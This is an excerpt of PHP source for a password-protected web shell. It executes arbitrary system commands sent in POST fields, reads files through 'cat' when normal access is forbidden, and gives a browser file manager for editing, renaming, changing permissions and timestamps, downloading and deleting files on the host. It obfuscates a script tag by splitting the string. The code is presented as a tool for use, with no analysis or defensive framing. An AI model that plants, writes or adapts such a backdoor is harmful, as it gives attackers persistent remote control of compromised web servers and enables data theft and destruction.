...
if (isset($_POST['Rsynx'])) {
    $komendnya = $_POST['Rsynx'];
    echo rivenC($komendnya);
}
function rivenRead($this_file)
{
    global $hayoloh;
    global $func_exist;
    global $f_get;
    ...
    if ($func_exist($fo)) {
        ...
        if ($fi_le) {
            ...
            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
                $content = rivenC('cat "' . addslashes($this_file) . '"');
            }
            while (!feof($fi_le)) {
...
$uikit_css = "https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/css/uikit.min.css";
$uikit_rtl = "https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/css/uikit-rtl.min.css";
$uikit_js = "https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/js/uikit.min.js";
$uikit_icon = "https://cdn.jsdelivr.net/gh/lucenbyte/uikit-framework/js/uikit-icons.min.js";
...
$passwd = '168f968e8921464e375e3056699c78c68530778e'; // Change this password, SHA1
...
if (isset($_GET['logout'])) {
    ...
    session_unset();
    session_destroy();
    setcookie('token_gid', '', time() - 3600);
    echo "<s" . "c" . "ri" . "pt" . ">" . "window.location.assign('" . $_SERVER['PHP_SELF'] . "')" . "</" . "sc" . "ri" . "pt" . ">";
    exit();
}
if (empty($_SESSION['gidauth'])) {
    if (empty($_COOKIE['token_gid'])) {
?>
    ...
    <header class="uk-width-1-1" style="background: var(--gray-900);">
        <div class="uk-margin-small-left">
            ...
            <div class="uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
                ...
                echo '<a class="font-red" href="?L=/"><i class="fa-sharp fa-solid fa-slash-forward"></i></a>';
                foreach ($pa_t_hs as $id => $pat) {
                    echo "<a class='path' href='?L=";
                    for ($i = 0; $i <= $id; $i++) {
                        echo $pa_t_hs[$i];
                        if ($i != $id) {
                            echo '/';
    ...
    <div class="uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap"
        ...
        if ($toolsparam === null) {
            ...
            if (isset($_POST['btn-cmd'])) {
                echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>' . rivenC($_POST["komendnya"]) . '</textarea>';
            }
            echo '</div>
                    </fieldset>
                </form>
                ...
                <table class="synx-table uk-width-1-1">
                    ...
                    <tbody>
                        ...
                        foreach ($scan as $dir) {
                            ...
                            echo '<td class="body-folder uk-text-nowrap"><a href="?L=' . $path . '/' . $dir . '" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;' . $dir . '</a></td>';
                            echo '<td class="uk-text-nowrap"><a href="?L=' . $path . '&changedate=' . $dir . '" class="body-datetime">' . date('Y-m-d H:i:s', filemtime($path . '/' . $dir)) . '</a></td>';
                            ...
                            echo '</td>';
                            echo '<td class="uk-text-nowrap"><a href="?L=' . $path . '&permission=' . $dir . '" class="body-permission">';
                            if ($is_w("$path/$dir"))
                            ...
                            if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                                echo '</font></a></td>';
                            echo '<td class="uk-text-nowrap">';
                            echo '<a href="?L=' . $path . '&rename=' . $dir . '" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-folder-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&permission=' . $dir . '" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&deletedir=' . $dir . '" uk-tooltip="Permission"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';
                            echo '</td>';
                            echo '</tr>';
                        }
                        foreach ($scan as $file) {
                            ...
                            echo '<td class="body-file uk-text-nowrap"><a href="?L=' . $path . '&editfile=' . $file . '" class="filepath font-white"><i class="fa-solid fa-files font-white"></i>&nbsp;&nbsp;' . $file . '</a></td>';
                            echo '<td class="uk-text-nowrap"><a href="?L=' . $path . '&changedate=' . $file . '" class="body-datetime">' . date('Y-m-d H:i:s', filemtime($path . '/' . $file)) . '</a></td>';
                            ...
                            echo '</td>';
                            echo '<td class="uk-text-nowrap"><a href="?L=' . $path . '&permission=' . $file . '" class="body-permission">';
                            if ($is_w("$path/$file"))
                                echo '<font class="font-green green-perms">';
                            ...
                            if ($is_w("$path/$file") || !$is_r("$path/$file"))
                                echo '</font></a></td>';
                            echo '<td class="uk-text-nowrap">';
                            echo '<a href="?L=' . $path . '&rename=' . $file . '" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-file-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&editfile=' . $file . '" class="uk-margin-small-left" uk-tooltip="Edit"><i class="icon fa-regular fa-file-pen edit-file-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&permission=' . $file . '" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&downloadfile=' . $file . '" class="uk-margin-small-right" uk-tooltip="Download"><i class="icon fa-solid fa-folder-arrow-down download-icon"></i></a>';
                            echo '<a href="?L=' . $path . '&deletefile=' . $file . '" uk-tooltip="Delete"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';
                            echo '</td>';
                            echo '</tr>';
                        }
                        ?>
